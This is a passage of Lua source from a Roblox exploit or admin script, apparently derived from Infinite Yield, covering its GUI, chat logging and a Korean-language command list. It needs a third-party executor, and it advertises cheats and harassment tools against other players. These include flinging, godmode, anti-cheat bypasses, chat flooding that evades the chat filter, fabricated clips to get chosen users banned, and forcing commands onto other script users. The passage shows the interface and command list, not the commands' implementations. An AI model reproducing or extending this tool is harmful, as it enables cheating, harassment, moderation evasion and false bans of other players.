				updateColors(cache_currentShade1, shade1)
				updateColors(cache_currentShade2, shade2)
				updateColors(cache_currentShade3, shade3)
				updateColors(cache_currentText1, text1)
				updateColors(cache_currentText2, text2)
				updateColors(cache_currentScroll, scroll)
				wait()
				updatesaves()
			end

			v2.Default = function()
				local _shade1 = shade1
				updateColors(Color3.fromRGB(36, 36, 37), _shade1)
				local _shade2 = shade2
				updateColors(Color3.fromRGB(46, 46, 47), _shade2)
				local _shade3 = shade3
				updateColors(Color3.fromRGB(78, 78, 79), _shade3)
				local _text1 = text1
				updateColors(Color3.new(1, 1, 1), _text1)
				local _text2 = text2
				updateColors(Color3.new(0, 0, 0), _text2)
				local _scroll = scroll
				updateColors(Color3.fromRGB(78, 78, 79), _scroll)
				wait()
				updatesaves()
			end
		else
			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
		end
	end)

	SettingsButton.MouseButton1Click:Connect(function()
		if flag2 == false then
			flag2 = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
			CMDsF.Visible = false
		else
			flag2 = false
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
		end
	end)

	On.MouseButton1Click:Connect(function()
		if flag3 == false then
			if StayOpen == false then
				StayOpen = true
				On.BackgroundTransparency = 0
			else
				StayOpen = false
				On.BackgroundTransparency = 1
			end

			updatesaves()
		end
	end)

	Clear.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_2:GetChildren()) do
			child:Destroy()
		end

		scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Clear_2.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_3:GetChildren()) do
			child:Destroy()
		end

		scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Toggle.MouseButton1Down:Connect(function()
		if logsEnabled then
			logsEnabled = false
			Toggle.Text = "Disabled"
			updatesaves()
		else
			logsEnabled = true
			Toggle.Text = "Enabled"
			updatesaves()
		end
	end)

	Toggle_2.MouseButton1Down:Connect(function()
		if jLogsEnabled then
			jLogsEnabled = false
			Toggle_2.Text = "Disabled"
			updatesaves()
		else
			jLogsEnabled = true
			Toggle_2.Text = "Enabled"
			updatesaves()
		end
	end)

	selectChat.MouseButton1Down:Connect(function()
		join.Visible = false
		chat.Visible = true
		table.remove(shade3, table.find(shade3, selectChat))
		table.remove(shade2, table.find(shade2, selectJoin))
		table.insert(shade2, selectChat)
		table.insert(shade3, selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
	end)

	selectJoin.MouseButton1Down:Connect(function()
		chat.Visible = false
		join.Visible = true
		table.remove(shade3, table.find(shade3, selectJoin))
		table.remove(shade2, table.find(shade2, selectChat))
		table.insert(shade2, selectJoin)
		table.insert(shade3, selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
	end)

	if not writefileExploit() then
		notify("Saves", "Your exploit does not support read/write file. Your settings will not save.")
	end

	ChatLog = function(arg)
		arg.Chatted:Connect(function(message)
			if logsEnabled == true then
				CreateLabel(arg.Name, message)
			end
		end)
	end

	JoinLog = function(arg)
		if jLogsEnabled == true then
			CreateJoinLabel(arg, arg.UserId)
		end
	end

	local function testHasher(data)
		return string.gsub(data, "[*\\?:<>|]+", "")
	end

	SaveChatlogs.MouseButton1Down:Connect(function()
		if writefileExploit() then
			if #scroll_2:GetChildren() > 0 then
				notify("Loading", "Hold on a sec")
				local v2 = testHasher(MarketplaceService:GetProductInfo(PlaceId).Name)
				local str2 = "-- Infinite Yield Chat logs for \"" .. v2 .. "\"\n"

				for _, child in pairs(scroll_2:GetChildren()) do
					str2 ..= "\n" .. child.Text
				end

				local str3 = tostring(str2)
				local n5 = 0
				local fn2 = nil

				fn2 = function()
					local v3

					pcall(function()
						v3 = readfile(v2 .. " Chat Logs (" .. n5 .. ").txt")
					end)

					if v3 then
						n5 += 1
						fn2()
					else
						writefileCooldown(v2 .. " Chat Logs (" .. n5 .. ").txt", str3)
					end
				end

				fn2()
				notify("Chat Logs", "Saved chat logs to the workspace folder within your exploit folder.")
			end
		else
			notify("Chat Logs", "Your exploit does not support write file. You cannot save chat logs.")
		end
	end)

	for _, child in pairs(Players:GetChildren()) do
		if child.ClassName == "Player" then
			ChatLog(child)
		end
	end

	Players.PlayerRemoving:Connect(function(player)
		if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name .. "_LC") then
			for _, child in pairs(COREGUI:GetChildren()) do
				if child.Name == player.Name .. "_ESP" or child.Name == player.Name .. "_LC" or child.Name == player.Name .. "_CHMS" then
					child:Destroy()
				end
			end
		end

		if viewing ~= nil and player == viewing then
			workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
			viewing = nil

			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end

			notify("Spectate", "View turned off (player left)")
		end
	end)

	Exit.MouseButton1Down:Connect(function()
		getgenv().delvape("Logs")
		logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
	end)

	Hide.MouseButton1Down:Connect(function()
		if logs.Position ~= UDim2.new(0, 0, 1, -20) then
			logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
		else
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end
	end)

	EventBind.MouseButton1Click:Connect(function()
		eventEditor.Frame:TweenPosition(UDim2.new(0.5, -175, 0.5, -101), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close.MouseButton1Click:Connect(function()
		getgenv().delvape("Keybinds")
		SettingsHolder.Visible = true
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Add.MouseButton1Click:Connect(function()
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
	end)

	Delete.MouseButton1Click:Connect(function()
		binds = {}
		refreshbinds()
		updatesaves()
		notify("Keybinds Updated", "Removed all keybinds")
	end)

	Close_2.MouseButton1Click:Connect(function()
		getgenv().delvape("Aliases")
		SettingsHolder.Visible = true
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Aliases.MouseButton1Click:Connect(function()
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close_3.MouseButton1Click:Connect(function()
		getgenv().delvape("Waypoints")
		SettingsHolder.Visible = true
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Positions.MouseButton1Click:Connect(function()
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	local selectionBox = Instance.new("SelectionBox")
	selectionBox.Name = randomString()
	selectionBox.Color3 = Color3.new(255, 255, 255)
	selectionBox.Adornee = nil
	selectionBox.Parent = PARENT
	local selectionBox2 = Instance.new("SelectionBox")
	selectionBox2.Name = randomString()
	selectionBox2.Color3 = Color3.new(0, 166, 0)
	selectionBox2.Adornee = nil
	selectionBox2.Parent = PARENT
	local connection = nil
	local connection2 = nil

	selectPart = function()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)

		connection = IYMouse.Move:Connect(function()
			if selectionBox2.Adornee ~= IYMouse.Target then
				selectionBox.Adornee = IYMouse.Target
			else
				selectionBox.Adornee = nil
			end
		end)

		connection2 = IYMouse.Button1Down:Connect(function()
			if IYMouse.Target ~= nil then
				selectionBox2.Adornee = IYMouse.Target
				Path.Text = getHierarchy(IYMouse.Target)
			end
		end)
	end

	Part.MouseButton1Click:Connect(function()
		selectPart()
	end)

	Exit_4.MouseButton1Click:Connect(function()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)

		if connection then
			connection:Disconnect()
		end

		if connection2 then
			connection2:Disconnect()
		end

		selectionBox.Adornee = nil
		selectionBox2.Adornee = nil
		Path.Text = ""
	end)

	CopyPath.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			toClipboard(Path.Text)
		else
			notify("Copy Path", "Select a part to copy its path")
		end
	end)

	ChoosePart.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			local str2 = ""
			local fn2 = nil

			fn2 = function()
				local flag5 = false

				for _, v2 in pairs(pWayPoints) do
					local name = selectionBox2.Adornee.Name

					if v2.NAME:lower() == name:lower() .. str2 then
						flag5 = true
					end
				end

				if not flag5 then
					notify("Modified Waypoints", "Created waypoint: " .. selectionBox2.Adornee.Name .. str2)
					pWayPoints[#pWayPoints + 1] = { NAME = selectionBox2.Adornee.Name .. str2, COORD = { selectionBox2.Adornee } }
				else
					if isNumber(str2) then
						str2 += 1
					else
						str2 = 1
					end

					fn2()
				end
			end

			fn2()
			refreshwaypoints()
		else
			notify("Part Selection", "Select a part first")
		end
	end)

	cmds = {}
	customAlias = {}

	Delete_3.MouseButton1Click:Connect(function()
		customAlias = {}
		aliases = {}
		notify("Aliases Modified", "Removed all aliases")
		updatesaves()
		refreshaliases()
	end)

	PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
		prefix = PrefixBox.Text
		Cmdbar.PlaceholderText = "Command Bar (" .. prefix .. ")"
		updatesaves()
	end)

	CamViewport = function()
		if workspace.CurrentCamera then
			return workspace.CurrentCamera.ViewportSize.X
		end
	end

	UpdateToViewport = function()
		if Holder.Position.X.Offset < -CamViewport() then
			local scale = Holder.Position.Y.Scale
			local offset = Holder.Position.Y.Offset
			Holder:TweenPosition(UDim2.new(1, -CamViewport(), scale, offset), "InOut", "Quart", 0.04, true, nil)
			local scale2 = Notification.Position.Y.Scale
			local offset2 = Notification.Position.Y.Offset
			Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, scale2, offset2), "InOut", "Quart", 0.04, true, nil)
		end
	end

	CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)

	updateCamera = function(arg, arg2)
		if arg2 ~= workspace then
			CamMoved:Disconnect()
			CameraChanged:Disconnect()

			repeat
				wait()
			until workspace.CurrentCamera

			CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
			CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
		end
	end

	CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)

	dragMain = function(arg, arg2)
		task.spawn(function()
			local flag5 = nil
			local v2 = nil
			local vector = Vector3.zero
			local position = nil

			local function fn2(arg3)
				local n5 = arg3.Position - vector
				local n6

				if position.X.Offset + n5.X <= -500 then
					local udim2 = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(0.2), { Position = udim2 }):Play()
					n6 = 250
				else
					local udim2 = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(0.2), { Position = udim2 }):Play()
					n6 = -250
				end

				local flag6 = position.X.Offset + n5.X <= -250

				if flag6 then
					local n7 = position.X.Offset + n5.X
					flag6 = -CamViewport() <= n7
				end

				if flag6 then
					local udim2 = UDim2.new(position.X.Scale, position.X.Offset + n5.X, arg2.Position.Y.Scale, arg2.Position.Y.Offset)
					TweenService:Create(arg2, TweenInfo.new(0.2), { Position = udim2 }):Play()
					local udim22 = UDim2.new(position.X.Scale, position.X.Offset + n5.X + n6, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(0.2), { Position = udim22 }):Play()
				elseif position.X.Offset + n5.X > -500 then
					local udim2 = UDim2.new(1, -250, arg2.Position.Y.Scale, arg2.Position.Y.Offset)
					TweenService:Create(arg2, TweenInfo.new(0.2), { Position = udim2 }):Play()
				elseif position.X.Offset + n5.X < -CamViewport() then
					local scale = arg2.Position.Y.Scale
					local offset = arg2.Position.Y.Offset
					arg2:TweenPosition(UDim2.new(1, -CamViewport(), scale, offset), "InOut", "Quart", 0.04, true, nil)
					local scale2 = arg2.Position.Y.Scale
					local offset2 = arg2.Position.Y.Offset
					local udim2 = UDim2.new(1, -CamViewport(), scale2, offset2)
					TweenService:Create(arg2, TweenInfo.new(0.2), { Position = udim2 }):Play()
					local scale3 = Notification.Position.Y.Scale
					local offset3 = Notification.Position.Y.Offset
					local udim22 = UDim2.new(1, -CamViewport() + 250, scale3, offset3)
					TweenService:Create(Notification, TweenInfo.new(0.2), { Position = udim22 }):Play()
				end
			end

			arg.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					flag5 = true
					vector = input.Position
					position = arg2.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							flag5 = false
						end
					end)
				end
			end)

			arg.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					v2 = input
				end
			end)

			UserInputService.InputChanged:Connect(function(input)
				if input == v2 and flag5 then
					fn2(input)
				end
			end)
		end)
	end

	dragMain(Title, Holder)

	Match = function(arg, arg2)
		local str2 = arg2:gsub("%W", "%%%1")
		return arg:lower():find(str2:lower()) and true
	end

	local vector2 = Vector2.new(0, 0)
	local text = nil

	IndexContents = function(arg, arg2, arg3, arg4)
		CMDsF.CanvasPosition = Vector2.new(0, 0)
		local _CMDsF = CMDsF
		text = nil
		local tbl5 = {}

		if arg:sub(#arg, #arg) == "\\" then
			arg = ""
		end

		for match in string.gmatch(arg, "[^\\]+") do
			table.insert(tbl5, match)
		end

		if #tbl5 > 0 then
			arg = tbl5[#tbl5]
		end

		if arg:sub(1, 1) == "!" then
			arg = arg:sub(2)
		end

		local _next = next
		local children, children2 = _CMDsF:GetChildren()
		local n5 = 0

		for _, v2 in _next, children, children2 do
			if v2:IsA("TextButton") then
				if arg2 then
					if Match(v2.Text, arg) then
						n5 += 1
						v2.Visible = true

						if text == nil then
							text = v2.Text
						end
					else
						v2.Visible = false
					end
				else
					v2.Visible = true

					if text == nil then
						text = v2.Text
					end
				end
			end
		end

		_CMDsF.CanvasSize = UDim2.new(0, 0, 0, cmdListLayout.AbsoluteContentSize.Y)

		if not arg4 then
			if n5 == 0 or string.find(arg, " ") then
				if not arg3 then
					minimizeHolder()
				elseif arg3 then
					cmdbarHolder()
				end
			else
				maximizeHolder()
			end
		else
			minimizeHolder()
		end
	end

	PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
	local chatBar = nil

	task.spawn(function()
		if pcall(function()
			chatBar = game.WaitForChild(PlayerGui, "Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
		end) then
			local function fn2()
				vector2 = CMDsF.CanvasPosition
			end

			local connection3 = chatBar.Focused:Connect(fn2)

			local function fn3()
				if chatBar.Text:lower():sub(1, 1) == prefix then
					if flag2 == true then
						wait(0.2)
						CMDsF.Visible = true
						Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end

					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2), true)
				else
					minimizeHolder()

					if flag2 == true then
						wait(0.2)
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
						CMDsF.Visible = false
					end
				end
			end

			local connection4 = chatBar:GetPropertyChangedSignal("Text"):Connect(fn3)

			local function fn4(enterPressed)
				local flag5 = not enterPressed
				local flag6

				if flag5 then
					flag6 = flag5
				else
					local _prefix = prefix
					flag6 = chatBar.Text:lower():sub(1, 1) ~= _prefix
				end

				if flag6 then
					IndexContents("", true)
				end

				CMDsF.CanvasPosition = vector2
				minimizeHolder()
			end

			local connection5 = chatBar.FocusLost:Connect(fn4)

			PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(child)
				wait()

				if child:FindFirstChild("BoxFrame") then
					chatBar = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar

					if connection3 then
						connection3:Disconnect()
					end

					connection3 = chatBar.Focused:Connect(fn2)

					if connection4 then
						connection4:Disconnect()
					end

					connection4 = chatBar:GetPropertyChangedSignal("Text"):Connect(fn3)

					if connection5 then
						connection5:Disconnect()
					end

					connection5 = chatBar.FocusLost:Connect(fn4)
				end
			end)
		end
	end)

	autoComplete = function(arg, arg2)
		local tbl5 = { "[", "/", "(", " " }
		local n5 = 0

		for i = 1, #arg do
			local str2 = arg:sub(i, i)
			if table.find(tbl5, str2) then
				n5 = i
				break
			end
		end

		arg2 = arg2 or Cmdbar.Text
		local v2 = string.find(arg2, "\\", 1)
		local n6 = 0

		while v2 do
			n6 = v2
			v2 = string.find(arg2, "\\", v2 + 1)
		end

		if arg2:sub(n6 + 1, n6 + 1) == "!" then
			n6 += 1
		end

		Cmdbar.Text = arg2:sub(1, n6) .. arg:sub(1, n5 - 1) .. " "
		wait()
		Cmdbar.Text = Cmdbar.Text:gsub("\t", "")
		Cmdbar.CursorPosition = #Cmdbar.Text + 1
	end

	CMDs = {}
	CMDs[#CMDs + 1] = { NAME = "test", DESC = "콘솔에 aaa를 출력합니다" }
	CMDs[#CMDs + 1] = { NAME = "fling", DESC = "타겟플레이어를 날립니다" }
	CMDs[#CMDs + 1] = { NAME = "loopfling", DESC = "타겟 플레이어(들)을 계속 날립니다" }
	CMDs[#CMDs + 1] = { NAME = "rj", DESC = "서버를 다시 접속합니다" }
	CMDs[#CMDs + 1] = { NAME = "attach/at (player)", DESC = "어태치" }
	CMDs[#CMDs + 1] = { NAME = "unattach/unat", DESC = "어태치 중지" }
	CMDs[#CMDs + 1] = { NAME = "setat/setattach", DESC = "attach 거리설정" }

	CMDs[#CMDs + 1] = {
		NAME = "teleport/tp/to/goto (player, dummy)",
		DESC = "플레이어한태 순간이동합니다(이름지정,dummy한태 지정시 더미한태 이동)",
	}

	CMDs[#CMDs + 1] = { NAME = "re", DESC = "리셋하고 그자리에서 탤래포트를합니다" }
	CMDs[#CMDs + 1] = { NAME = "reset", DESC = "강제리셋" }
	CMDs[#CMDs + 1] = { NAME = "antideathcountergui/adcgui", DESC = "언노운 안티 데스카운터 GUI를 엽니다(데스카운터 우회)" }

	CMDs[#CMDs + 1] = {
		NAME = "crabadd/crabspawn (사용금지)",
		DESC = "공섭에서 개보스를 로벅스를주고 소환할수있습니다(299롭) 만약 소환후 잡고 다시실행하면 개보스로 변합니다",
	}

	CMDs[#CMDs + 1] = { NAME = "phantasmbreakergui/phbgui", DESC = "판타즘 세미갓모드 유저를 고장내는 gui를 로딩합니다" }
	CMDs[#CMDs + 1] = { NAME = "upsidedown/upd", DESC = "캐릭터를 180도 뒤집습니다" }
	CMDs[#CMDs + 1] = { NAME = "unupsidedown/unupd", DESC = "캐릭터 뒤집기를 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "antiragdoll/antirg(patched)", DESC = "안티레그돌" }
	CMDs[#CMDs + 1] = { NAME = "unantiragdoll/unantirg", DESC = "안티레그돌 중지" }
	CMDs[#CMDs + 1] = { NAME = "nodashcooldown/nodc", DESC = "대시 쿨다운을 제거합니다" }
	CMDs[#CMDs + 1] = { NAME = "unnodashcooldown/unnodc", DESC = "대시 쿨다운 제거를 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "fly/flight", DESC = "카메라 방향으로 자유롭게 비행할 수 있습니다" }
	CMDs[#CMDs + 1] = { NAME = "unfly/unflight", DESC = "비행을 종료합니다" }
	CMDs[#CMDs + 1] = { NAME = "emotedash/edash", DESC = "이모트대쉬를 사용할수 있습니다" }
	CMDs[#CMDs + 1] = { NAME = "unemotedash/unedash", DESC = "이모트 대시를 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "tpwalk/tpspeed (수)", DESC = "tpwalk입니다" }
	CMDs[#CMDs + 1] = { NAME = "untpwalk/untpspeed", DESC = "tpwalk삭제" }
	CMDs[#CMDs + 1] = { NAME = "wallcomboanywhere/wcba", DESC = "어디서든 벽콤보를 사용합니다" }
	CMDs[#CMDs + 1] = { NAME = "unwallcomboanywhere/unwcba", DESC = "wallcomboanywhere를 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "bringwallcomboanywhere/bwcba", DESC = "월콤보브링gui를 엽니다" }
	CMDs[#CMDs + 1] = { NAME = "autotechgui/ATgui", DESC = "오토테크 gui 로딩합니다" }
	CMDs[#CMDs + 1] = { NAME = "resettp", DESC = "죽고 플레이어한태 tp를 합니다" }
	CMDs[#CMDs + 1] = { NAME = "addvape(debug)", DESC = "vapeui 리스트추가" }
	CMDs[#CMDs + 1] = { NAME = "delvape(debug)", DESC = "vapeui 리스트 삭제" }
	CMDs[#CMDs + 1] = { NAME = "clicktpgui/ctg", DESC = "클릭tp gui 로딩" }
	CMDs[#CMDs + 1] = { NAME = "unclicktpgui/unctg", DESC = "클릭tpgui 없애기" }
	CMDs[#CMDs + 1] = { NAME = "teleportallgui/tpa", DESC = "탤포올 gui" }
	CMDs[#CMDs + 1] = { NAME = "bang (player) (speed)", DESC = "타겟 플레이어에게 붙어서 뱅 모션을 실행합니다" }
	CMDs[#CMDs + 1] = { NAME = "unbang", DESC = "뱅을 중지합니다" }
	CMDs[#CMDs + 1] = { NAME = "standgui/stand", DESC = "스탠드 설정 GUI를 엽니다" }
	CMDs[#CMDs + 1] = { NAME = "unstandgui/unstand", DESC = "스탠드 기능을 끄고 GUI를 닫습니다" }
	CMDs[#CMDs + 1] = { NAME = "aikeyboard", DESC = "Groq AI 기반 자동 키배 매크로 스크립트를 로딩합니다 (프리미엄 전용)" }
	CMDs[#CMDs + 1] = { NAME = "kill (admin script user)", DESC = "서버에 있는 스크립트 사용자를 처치합니다" }
	CMDs[#CMDs + 1] = { NAME = "kick (admin script user) (reason)", DESC = "서버에 있는 스크립트 사용자를 강제 퇴장시킵니다" }
	CMDs[#CMDs + 1] = { NAME = "listofuser/lou", DESC = "현재 서버의 스크립트 사용자 목록 GUI를 엽니다" }
	CMDs[#CMDs + 1] = { NAME = "autohitgui/ahg", DESC = "HVH 에 유용한 자동히트 gui" }
	CMDs[#CMDs + 1] = { NAME = "antivoid/voidprot", DESC = "공허에 떨어져도 죽지 않게 보호합니다 (낙하 방지 및 무한 층 바닥)" }
	CMDs[#CMDs + 1] = { NAME = "unantivoid/unvoid", DESC = "안티보이드(공허 보호) 기능을 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "forcecmd (player) (cmd) (target)", DESC = "무료버전 유저에게 강제로 명령어를 실행시킵니다 (채팅 및 원격 연동)" }

	CMDs[#CMDs + 1] = {
		NAME = "forceinvite/finvite (player)",
		DESC = "다른 서버의 스크립트 유저를 현재 관리자 서버로 강제 소환합니다 (같은 서버 제외)",
	}

	CMDs[#CMDs + 1] = { NAME = "scriptacc/allacc (text)", DESC = "모든 유저에게 팝업 공지사항 GUI를 전송합니다 (X버튼/확인버튼 탑재)" }
	CMDs[#CMDs + 1] = { NAME = "message/msg (player) (text)", DESC = "특정 스크립트 유저에게 개인 메시지 알림을 전송합니다" }
	CMDs[#CMDs + 1] = { NAME = "serverinfo/sinfo", DESC = "현재 서버 시간, 인원, PlaceId, JobId 정보 GUI를 엽니다 (복사 버튼 탑재)" }
	CMDs[#CMDs + 1] = { NAME = "chatflood", DESC = "자동 채팅 도배 GUI를 엽니다 (글자 사이 랜덤 | 와 4자리 숫자로 채팅필터 우회)" }
	CMDs[#CMDs + 1] = { NAME = "unchatflood", DESC = "자동 채팅 도배 GUI를 닫고 도배를 중지합니다" }
	CMDs[#CMDs + 1] = { NAME = "plugins/manageplugins", DESC = "플러그인 관리 GUI를 엽니다 (;plugins add/del 사용 가능)" }
	CMDs[#CMDs + 1] = { NAME = "animationlogger/alogger", DESC = "애니매이션 로거 gui" }
	CMDs[#CMDs + 1] = { NAME = "cobalt/rspy", DESC = "cobalt gui" }
	CMDs[#CMDs + 1] = { NAME = "autoframgui/afgui", DESC = "autofram gui" }
	CMDs[#CMDs + 1] = { NAME = "bypassantiskill/noanim", DESC = "모든 애니메이션 재생을 비활성화합니다" }
	CMDs[#CMDs + 1] = { NAME = "unbypassantiskill/unnoanim", DESC = "애니메이션 재생 비활성화를 해제합니다" }
	CMDs[#CMDs + 1] = { NAME = "fakepos/desync", DESC = "fakepos(desync) GUI를 엽니다 (프리미엄 전용)" }
	CMDs[#CMDs + 1] = { NAME = "fakeclipgui/fakeclip", DESC = "원하는사람을 밴할수있는 가짜클립 gui 를 엽니다 (프리미엄 전용)" }
	CMDs[#CMDs + 1] = { NAME = "godmodegui/godmode", DESC = "godmode gui 를 엽니다" }
	CMDs[#CMDs + 1] = { NAME = "invisable/invis", DESC = "투명하게합니다" }
	CMDs[#CMDs + 1] = { NAME = "uninvisable/uninvis", DESC = "투명해제" }
	CMDs[#CMDs + 1] = { NAME = "plugins/plugin/manageplugins", DESC = "플러그인" }
	wait()

	for i = 1, #CMDs do
		if getGlobal(CMDs[i].NAME:split(" ")[1]:split("/")[1]) <= userRank then
			local clone = Example:Clone()
			clone.Parent = CMDsF
			clone.Visible = false
			clone.Text = CMDs[i].NAME
			clone.Name = "CMD"
			table.insert(text1, clone)

			if CMDs[i].DESC ~= "" then
				clone:SetAttribute("Title", CMDs[i].NAME)
				clone:SetAttribute("Desc", CMDs[i].DESC)

				clone.MouseButton1Down:Connect(function()
					if clone.Visible and clone.TextTransparency == 0 then
						local text3 = Cmdbar.Text
						Cmdbar:CaptureFocus()
						autoComplete(clone.Text, text3)
						maximizeHolder()
					end
				end)
			end
		end
	end

	IndexContents("", true)

	checkTT = function()
		local guiObjectsAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
		local v2 = nil

		for _, v3 in pairs(guiObjectsAtPosition) do
			if v3.Parent == CMDsF then
				v2 = v3
			end
		end

		if v2 ~= nil and v2:GetAttribute("Title") ~= nil then
			local x = IYMouse.X
			local y = IYMouse.Y
			local n5

			if IYMouse.X > 200 then
				n5 = x - 201
			else
				n5 = x + 21
			end

			if IYMouse.ViewSizeY - 96 < IYMouse.Y then
				y -= 97
			end

			Tooltip.Position = UDim2.new(0, n5, 0, y)
			Description.Text = v2:GetAttribute("Desc")

			if v2:GetAttribute("Title") ~= nil then
				Title_3.Text = v2:GetAttribute("Title")
			else
				Title_3.Text = ""
			end

			Tooltip.Visible = true
		else
			Tooltip.Visible = false
		end
	end

	FindInTable = function(arg, arg2)
		if arg == nil then
			return false
		end

		for _, v2 in pairs(arg) do
			if v2 == arg2 then
				return true
			end
		end

		return false
	end

	GetInTable = function(arg, arg2)
		for i = 1, #arg do
			if arg[i] == arg2 then
				return i
			end
		end

		return false
	end

	FindInTable = GetInTable

	respawn = function(arg)
		if invisRunning then
			TurnVisible()
		end

		local character = arg.Character

		if character:FindFirstChildOfClass("Humanoid") then
			character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
		end

		character:ClearAllChildren()
		local model = Instance.new("Model")
		model.Parent = workspace
		arg.Character = model
		wait()
		arg.Character = character
		model:Destroy()
	end

	local flag5 = false

	refresh = function(arg)
		flag5 = true
		local humanoid = arg.Character and arg.Character:FindFirstChildOfClass("Humanoid", true)
		local cFrame = humanoid and humanoid.RootPart and humanoid.RootPart.CFrame
		local cFrame2 = workspace.CurrentCamera.CFrame
		respawn(arg)

		task.spawn(function()
			local rootPart = arg.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart
			local currentCamera = workspace.CurrentCamera
			local v2 = cFrame
			local v3 = wait() and cFrame2
			rootPart.CFrame = v2
			currentCamera.CFrame = v3
			flag5 = false
		end)
	end

	local cFrame = nil

	onDied = function()
		task.spawn(function()
			if pcall(function()
				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			end) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Died:Connect(function()
					if getRoot(Players.LocalPlayer.Character) then
						cFrame = getRoot(Players.LocalPlayer.Character).CFrame
					end
				end)
			else
				wait(2)
				onDied()
			end
		end)
	end

	Clip = true
	spDelay = 0.1

	Players.LocalPlayer.CharacterAdded:Connect(function()
		lastGroundCFrame = nil
		isTeleporting = false
		NOFLY()
		Floating = false

		if not Clip then
			execCmd("clip")
		end

		repeat
			wait()
		until getRoot(Players.LocalPlayer.Character)

		pcall(function()
			if spawnpoint and not flag5 and spawnpos ~= nil then
				wait(spDelay)
				local _spawnpos = spawnpos
				getRoot(Players.LocalPlayer.Character).CFrame = _spawnpos
			end
		end)

		onDied()
	end)

	onDied()

	getstring = function(arg)
		local n5 = arg - 1
		local str2 = ""

		for k, v2 in pairs(cargs) do
			if n5 < k then
				if str2 ~= "" then
					str2 ..= " " .. v2
				else
